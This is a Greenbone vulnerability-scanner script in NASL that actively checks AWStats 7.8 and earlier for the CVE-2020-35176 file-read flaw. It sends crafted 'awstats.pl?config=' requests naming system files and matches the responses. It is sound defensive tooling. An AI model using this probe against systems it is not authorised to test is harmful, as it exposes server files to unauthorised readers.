# SPDX-FileCopyrightText: 2020 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:awstats:awstats";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.145067");
  script_version("2025-09-09T14:09:45+0000");
  script_tag(name:"last_modification", value:"2025-09-09 14:09:45 +0000 (Tue, 09 Sep 2025)");
  script_tag(name:"creation_date", value:"2020-12-18 04:02:11 +0000 (Fri, 18 Dec 2020)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-01-08 05:15:00 +0000 (Fri, 08 Jan 2021)");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"Workaround");

  script_cve_id("CVE-2020-35176");

  script_name("AWStats <= 7.8 File Read Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_awstats_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("awstats/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"AWStats is prone to a file read vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"In AWStats cgi-bin/awstats.pl?config= accepts a partial absolute
  pathname (omitting the initial /etc), even though it was intended to only read a file in the
  /etc/awstats/awstats.conf format. NOTE: this issue exists because of an incomplete fix for
  CVE-2017-1000501 and CVE-2020-29600.");

  script_tag(name:"affected", value:"AWStats version 7.8 and prior.");

  script_tag(name:"solution", value:"An unreleased source code patch is available in the linked
  references.");

  script_xref(name:"URL", value:"https://github.com/eldy/awstats/issues/195");
  script_xref(name:"URL", value:"https://github.com/eldy/AWStats/pull/196");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("traversal_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];
  file = split(file, sep: "/", keep: FALSE);
  if (!isnull(file[1]))
    file = file[1];
  else
    file = file[0];

  url = dir + "/awstats.pl?config=" + file;

  if (http_vuln_check(port: port, url: url, pattern: file, check_header: TRUE,
                      extra_check: make_list("Warning: Syntax error line", "Config line is ignored."))) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
